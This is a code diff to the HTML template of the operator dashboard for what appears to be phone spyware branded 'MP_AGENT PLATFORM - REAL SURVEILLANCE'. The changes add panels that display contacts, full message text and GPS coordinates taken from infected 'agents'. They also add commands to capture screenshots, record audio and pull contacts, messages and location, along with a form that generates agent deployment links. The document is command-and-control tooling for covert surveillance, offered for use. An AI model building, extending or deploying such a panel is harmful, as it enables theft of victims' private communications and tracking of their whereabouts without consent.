@@ -57,6 +57,7 @@
         .btn-success { background: var(--success); color: white; }
         .btn-danger { background: var(--danger); color: white; }
         .btn-warning { background: var(--warning); color: black; }
+        .btn-info { background: #17a2b8; color: white; }
         .btn:hover { opacity: 0.9; transform: translateY(-2px); }
         
         /* Platform Info */
@@ -83,6 +84,18 @@
         .debug-section a { color: #4CAF50; text-decoration: none; margin: 0 10px; }
         .debug-section a:hover { text-decoration: underline; }
         
+        /* Data Items */
+        .contact-item, .message-item, .location-item { 
+            background: var(--lighter); 
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 8px; 
+            border-left: 4px solid var(--primary);
+        }
+        .contact-item { border-left-color: #4CAF50; }
+        .message-item { border-left-color: #2196F3; }
+        .location-item { border-left-color: #FF9800; }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .nav { flex-direction: column; }
@@ -93,8 +106,8 @@
 </head>
 <body>
     <div class="header">
-        <h1>🎯 MP_AGENT PLATFORM</h1>
-        <p>Complete Surveillance Control Center</p>
+        <h1>🎯 MP_AGENT PLATFORM - REAL SURVEILLANCE</h1>
+        <p>Complete REAL-TIME Surveillance Control Center</p>
     </div>
 
     <div class="nav">
@@ -103,7 +116,9 @@
             <a href="/dashboard">📱 Simple Dashboard</a>
             <a href="/admin#agents">📱 Agents</a>
             <a href="/admin#screenshots">🖼️ Screenshots</a>
-            <a href="/admin#calls">📞 Calls</a>
+            <a href="/admin#contacts">👥 Contacts</a>
+            <a href="/admin#messages">💬 Messages</a>
+            <a href="/admin#locations">📍 Locations</a>
             <a href="/admin#deploy">🚀 Deploy</a>
             <a href="/admin#commands">⚡ Commands</a>
             <a href="/admin#logs">📋 Logs</a>
@@ -117,19 +132,18 @@
     <div class="platform-info">
         <strong>🌐 Platform URL:</strong> {{ platform_url }} | 
         <strong>Status:</strong> 🟢 ONLINE | 
-        <strong>Agents:</strong> {{ stats.active_agents }} Active
+        <strong>Agents:</strong> {{ stats.active_agents }} Active |
+        <strong>REAL DATA COLLECTION:</strong> 🎯 ACTIVE
     </div>
 
     <!-- Debug Section -->
     <div class="debug-section">
         <strong>🔧 Debug Tools:</strong> 
-        <a href="/debug/agents">View All Agents in DB</a> | 
-        <a href="/debug/screenshots">View All Screenshots in DB</a> | 
-        <a href="/test/register_agent">Test Agent Registration</a> | 
-        <a href="/debug/fix_database">Fix Database Schema</a> |
+        <a href="/debug/agents">View All Agents</a> | 
+        <a href="/debug/screenshots">View All Screenshots</a> | 
+        <a href="/debug/clear_data">Clear All Data</a> |
         <strong>Total Agents:</strong> {{ all_agents|length }} | 
-        <strong>Active Agents:</strong> {{ agents|length }} |
-        <strong>Total Screenshots:</strong> {{ stats.total_screenshots }}
+        <strong>Active Agents:</strong> {{ agents|length }}
     </div>
 
     <!-- Statistics -->
@@ -140,15 +154,19 @@
         </div>
         <div class="stat-card">
             <div class="stat-number" style="color: var(--primary);">{{ stats.total_screenshots }}</div>
-            <div>Screenshots Captured</div>
+            <div>Real Screenshots</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" style="color: var(--warning);">{{ stats.total_calls }}</div>
-            <div>Call Records</div>
+            <div class="stat-number" style="color: #4CAF50;">{{ stats.total_contacts }}</div>
+            <div>Real Contacts</div>
         </div>
         <div class="stat-card">
-            <div class="stat-number" style="color: var(--secondary);">{{ stats.total_deployments }}</div>
-            <div>Deployments</div>
+            <div class="stat-number" style="color: #2196F3;">{{ stats.total_messages }}</div>
+            <div>Real Messages</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" style="color: #FF9800;">{{ stats.total_locations }}</div>
+            <div>Real Locations</div>
         </div>
         <div class="stat-card">
             <div class="stat-number" style="color: var(--danger);">{{ stats.pending_commands }}</div>
@@ -169,8 +187,8 @@
                 <p><strong>IP:</strong> {{ agent.ip_address or 'Unknown' }}</p>
                 <p><strong>First Seen:</strong> {{ agent.first_seen or 'Never' }}</p>
                 <p><strong>Last Seen:</strong> {{ agent.last_seen or 'Never' }}</p>
-                <p><strong>Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
-                <p><strong>Calls:</strong> {{ agent.call_records or 0 }}</p>
+                <p><strong>Real Screenshots:</strong> {{ agent.screenshot_count or 0 }}</p>
+                <p><strong>Call Records:</strong> {{ agent.call_records or 0 }}</p>
                 <p><strong>Battery:</strong> 
                     {% if agent.battery_level %}
                         {% if agent.battery_level > 70 %}🟢
@@ -180,9 +198,12 @@
                         {{ agent.battery_level }}%
                     {% else %}Unknown{% endif %}
                 </p>
-                <div style="margin-top: 15px; display: flex; gap: 10px;">
+                <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+                    <a href="/admin/contacts/{{ agent.agent_id }}" class="btn btn-info">👥 Contacts</a>
+                    <a href="/admin/messages/{{ agent.agent_id }}" class="btn btn-info">💬 Messages</a>
+                    <a href="/admin/locations/{{ agent.agent_id }}" class="btn btn-info">📍 Locations</a>
                     <a href="/admin/clear_agent/{{ agent.agent_id }}" class="btn btn-danger" 
-                       onclick="return confirm('Delete agent {{ agent.agent_id }}?')">🗑️ Remove</a>
+                       onclick="return confirm('Delete ALL data for agent {{ agent.agent_id }}?')">🗑️ Remove</a>
                 </div>
             </div>
             {% endfor %}
@@ -190,53 +211,94 @@
         {% else %}
         <div style="text-align: center; padding: 40px; color: #888;">
             <p>No active agents. Deploy agents to see them here!</p>
-            {% if all_agents %}
-            <div style="margin-top: 20px;">
-                <h4>All Registered Agents (Inactive):</h4>
-                {% for agent in all_agents %}
-                <div style="background: #3d3d3d; padding: 10px; margin: 5px; border-radius: 5px;">
-                    <strong>{{ agent.agent_id }}</strong> - 
-                    Status: <span class="status-{{ agent.status }}">{{ agent.status }}</span> - 
-                    Last: {{ agent.last_seen or 'Never' }}
-                </div>
-                {% endfor %}
-            </div>
-            {% endif %}
         </div>
         {% endif %}
     </div>
 
-    <!-- Screenshots Section -->
+    <!-- Real Screenshots Section -->
     <div class="section" id="screenshots">
-        <h2>🖼️ Recent Screenshots ({{ screenshots|length }})</h2>
+        <h2>🖼️ Real Screenshots ({{ screenshots|length }})</h2>
         {% if screenshots %}
         <div class="screenshot-grid">
             {% for screenshot in screenshots %}
             <div class="screenshot-item">
                 <a href="/media/screenshot/{{ screenshot.id }}" target="_blank">
-                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Screenshot" class="screenshot-img"
-                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>No Image</div>'">
+                    <img src="/media/screenshot/{{ screenshot.id }}" alt="Real Screenshot" class="screenshot-img"
+                         onerror="this.style.background='#2d2d2d'; this.innerHTML='<div style=padding:40px;color:#888>Loading...</div>'">
                 </a>
                 <div style="margin-top: 10px;">
                     <strong>{{ screenshot.agent_id }}</strong><br>
                     <small>{{ screenshot.timestamp }}</small><br>
-                    <small>{{ screenshot.phone_model or 'Unknown Device' }}</small>
+                    <small>{{ screenshot.phone_model or 'Real Device' }}</small>
                 </div>
             </div>
             {% endfor %}
         </div>
         {% else %}
         <div style="text-align: center; padding: 40px; color: #888;">
-            <p>No screenshots yet. Agents will upload automatically.</p>
-            <p><small>Database shows {{ stats.total_screenshots }} total screenshots</small></p>
-            <a href="/debug/screenshots" class="btn btn-warning">Debug Screenshots</a>
+            <p>No real screenshots yet. Send 'capture_screenshot' command to agents!</p>
         </div>
+        {% endif %}
+    </div>
+
+    <!-- Real Contacts Section -->
+    <div class="section" id="contacts">
+        <h2>👥 Real Contacts ({{ contacts|length }})</h2>
+        {% if contacts %}
+        <div class="data-grid">
+            {% for contact in contacts %}
+            <div class="contact-item">
+                <strong>{{ contact.contact_name }}</strong><br>
+                <span style="color: #4CAF50;">📞 {{ contact.phone_number }}</span><br>
+                <small>Agent: {{ contact.agent_id }} | {{ contact.timestamp }}</small>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No real contacts collected yet. Send 'get_contacts' command!</p>
+        {% endif %}
+    </div>
+
+    <!-- Real Messages Section -->
+    <div class="section" id="messages">
+        <h2>💬 Real Messages ({{ messages|length }})</h2>
+        {% if messages %}
+        <div class="data-grid">
+            {% for message in messages %}
+            <div class="message-item">
+                <strong>{{ message.phone_number }}</strong> 
+                <span style="color: #2196F3; font-size: 0.9em;">({{ message.message_type }})</span><br>
+                <p style="margin: 8px 0;">{{ message.message_text }}</p>
+                <small>Agent: {{ message.agent_id }} | {{ message.timestamp }}</small>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No real messages collected yet. Send 'get_messages' command!</p>
+        {% endif %}
+    </div>
+
+    <!-- Real Locations Section -->
+    <div class="section" id="locations">
+        <h2>📍 Real Locations ({{ locations|length }})</h2>
+        {% if locations %}
+        <div class="data-grid">
+            {% for location in locations %}
+            <div class="location-item">
+                <strong>📍 {{ location.address or 'Unknown Location' }}</strong><br>
+                <span>Lat: {{ "%.6f"|format(location.latitude) }}, Lng: {{ "%.6f"|format(location.longitude) }}</span><br>
+                <small>Accuracy: {{ location.accuracy }}m | Agent: {{ location.agent_id }} | {{ location.timestamp }}</small>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <p style="text-align: center; padding: 20px; color: #888;">No real locations collected yet. Send 'get_location' command!</p>
         {% endif %}
     </div>
 
     <!-- Deployment Section -->
     <div class="section" id="deploy">
-        <h2>🚀 Deploy New Agent</h2>
+        <h2>🚀 Deploy New REAL Agent</h2>
         <div class="deploy-form">
             <form action="/deploy" method="post">
                 <div class="form-group">
@@ -247,7 +309,7 @@
                     <label for="agent_id">Agent ID (optional)</label>
                     <input type="text" id="agent_id" name="agent_id" placeholder="agent_001">
                 </div>
-                <button type="submit" class="btn btn-primary">🎯 Generate Deployment Link</button>
+                <button type="submit" class="btn btn-primary">🎯 Generate REAL Agent Deployment</button>
             </form>
         </div>
         
@@ -288,7 +350,7 @@
 
     <!-- Command Section -->
     <div class="section" id="commands">
-        <h2>⚡ Send Command</h2>
+        <h2>⚡ Send REAL Commands</h2>
         
         <form action="/admin/command" method="post">
             <div class="form-group">
@@ -305,35 +367,23 @@
                         </option>
                         {% endfor %}
                     {% else %}
-                        <option value="" disabled>No agents found in database</option>
+                        <option value="" disabled>No agents found</option>
                     {% endif %}
                 </select>
-                {% if not all_agents %}
-                <div style="color: #ff4444; margin-top: 10px;">
-                    ⚠️ No agents found in database. 
-                    <a href="/test/register_agent" style="color: #4CAF50;">Register a test agent</a> or 
-                    deploy a real agent.
-                </div>
-                {% endif %}
             </div>
             <div class="form-group">
-                <label for="command">Command</label>
+                <label for="command">REAL Data Collection Command</label>
                 <select id="command" name="command" required>
-                    <option value="capture_screenshot">📸 Capture Screenshot</option>
-                    <option value="get_device_info">📱 Get Device Info</option>
-                    <option value="get_location">📍 Get Location</option>
+                    <option value="capture_screenshot">📸 Capture REAL Screenshot</option>
+                    <option value="get_location">📍 Get REAL Location</option>
+                    <option value="get_contacts">👥 Get REAL Contacts</option>
+                    <option value="get_messages">💬 Get REAL Messages</option>
+                    <option value="get_device_info">📱 Get REAL Device Info</option>
                     <option value="record_audio">🎤 Record Audio</option>
-                    <option value="get_contacts">👥 Get Contacts</option>
-                    <option value="get_messages">💬 Get Messages</option>
-                    <option value="custom">Custom Command</option>
                 </select>
             </div>
-            <div class="form-group" id="custom_command_div" style="display: none;">
-                <label for="custom_command">Custom Command</label>
-                <input type="text" id="custom_command" name="custom_command" placeholder="Enter custom command">
-            </div>
             <button type="submit" class="btn btn-warning" {% if not all_agents %}disabled{% endif %}>
-                🚀 Send Command
+                🚀 Send REAL Command
             </button>
         </form>
 
@@ -374,7 +424,7 @@
 
     <!-- System Logs -->
     <div class="section" id="logs">
-        <h2>📋 System Logs</h2>
+        <h2>📋 Real-Time System Logs</h2>
         {% if logs %}
         <div class="command-console">
             {% for log in logs %}
@@ -396,18 +446,8 @@
     </div>
 
     <script>
-        // Command type toggle
-        document.getElementById('command').addEventListener('change', function() {
-            const customDiv = document.getElementById('custom_command_div');
-            if (this.value === 'custom') {
-                customDiv.style.display = 'block';
-            } else {
-                customDiv.style.display = 'none';
-            }
-        });
-
-        // Auto-refresh every 30 seconds
-        setTimeout(() => window.location.reload(), 30000);
+        // Auto-refresh every 15 seconds for real-time updates
+        setTimeout(() => window.location.reload(), 15000);
 
         // Smooth scrolling for navigation
         document.querySelectorAll('.nav a[href^="#"]').forEach(anchor => {
@@ -419,6 +459,11 @@
                 }
             });
         });
+
+        // Show notification for new data
+        if ({{ stats.total_screenshots }} > 0 || {{ stats.total_contacts }} > 0 || {{ stats.total_messages }} > 0 || {{ stats.total_locations }} > 0) {
+            console.log("🎯 REAL surveillance data is being collected!");
+        }
     </script>
 </body>
 </html>
